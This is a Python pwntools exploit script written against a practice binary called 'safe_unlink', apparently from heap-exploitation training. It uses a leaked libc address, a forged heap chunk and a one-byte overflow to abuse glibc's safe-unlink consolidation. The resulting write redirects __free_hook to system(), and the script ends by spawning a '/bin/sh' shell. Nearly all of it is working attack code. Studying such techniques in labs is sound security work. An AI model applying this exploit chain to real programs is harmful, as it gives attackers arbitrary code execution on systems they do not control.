#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("safe_unlink")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")

# Select the "free" option; send index.
def free(index):
    io.send("3")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil("> ")
io.timeout = 0.1

# =============================================================================

# Print the address of m_array, where the program stores pointers to its allocated chunks.
log.info(f"m_array @ 0x{elf.sym.m_array:02x}")

# Request 2 small chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x88)

# Prepare fake chunk metadata.
# A correct size field satisfies the size vs prev_size checks.
fake_chunk_header = p64(0) + p64(0x80)

# Set the fd such that the bk of the "chunk" it points to is the first entry in m_array.
fd = elf.sym.m_array - 0x18

# Set the bk such that the fd of the "chunk" it points to is also the first entry in m_array.
bk = elf.sym.m_array - 0x10

# Set the prev_size field of the next chunk to the actual previous chunk size - 0x10.
prev_size = 0x80
fake_size = 0x90

# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
edit(chunk_A, fake_chunk_header + p64(fd) + p64(bk) + p8(0)*0x60 + p64(prev_size) + p64(fake_size))

# Trigger backward consolidation
free(chunk_B)

# Check if safe unlink constraints are met:
# p *((struct malloc_chunk*) 0x603010).fd
# p *((struct malloc_chunk*) 0x603010).bk
# Check the result: dq mp_.sbrk_base

# Start writing 8 bytes before to fit "/bin/sh" string
edit(chunk_A, p64(0)*3 + p64(libc.sym.__free_hook - 8))
edit(chunk_A, b"/bin/sh\x00" + p64(libc.sym.system))
free(chunk_A)

io.interactive()

